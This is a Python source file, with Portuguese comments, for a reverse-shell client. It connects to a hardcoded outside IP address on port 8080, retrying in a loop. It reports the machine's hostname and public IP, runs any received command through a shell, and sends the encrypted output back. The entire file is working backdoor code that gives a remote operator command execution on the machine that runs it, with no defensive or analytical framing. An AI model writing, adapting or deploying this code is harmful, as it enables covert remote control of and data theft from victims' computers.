import socket
from time import sleep
import urllib.request
import crypt
import subprocess

def getip():
    try:
        try:
            ip_publico = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
            return ip_publico
        except Exception as e:
            return f"Error IP {e}"
    except Exception as e:
        print(f"Error retrieving local IP: {e}")
        return None
def connect():
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect(('45.157.16.196', 8080))
        return c
    except Exception as e:
        print(f"Error connecting t o server: {e}")

def listen(c):
    try:
        while True:
            data = c.recv(4096)
            if not data:
                break
                
            try:
                # Tenta descriptografar a mensagem recebida
                decrypted_data = crypt.decrypt_message(data).strip()
            except Exception:
                # Fallback para texto plano se a descriptografia falhar
                try:
                    decrypted_data = data.decode('utf-8').strip()
                except:
                    decrypted_data = str(data)

            if decrypted_data == "connected":
               msg = f"acknowledged: {socket.gethostname()} IP: {getip()}"
               c.sendall(crypt.encrypt_message(msg))
            elif decrypted_data == "/exit":
                break
            else:
                cmd(c, decrypted_data)
    except Exception as e:
        print(f"Error receiving data: {e}")
def cmd(c, command):
    try:
        p = subprocess.Popen(
            command, 
            shell=True,
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        stdout, stderr = p.communicate()
        
        # Garante que a resposta seja em bytes antes de criptografar
        resposta = b"\n" + stdout + stderr + b"\n"
        
        # Criptografa a resposta antes de enviar para o servidor
        encrypted_resposta = crypt.encrypt_message(resposta)
        c.sendall(encrypted_resposta)
        return True
    except Exception as e:
        print(f"CMD error: {e}")
        try:
            c.close()
        except:
            pass
        return False

if __name__ == "__main__":
    try:
        while True:
            client = connect()
            if client:
                listen(client)
                
            else:
                sleep(.5)
    except KeyboardInterrupt:
        print("Client stopped.")
    except Exception as e:
        print(f"An error occurred: {e}")
    
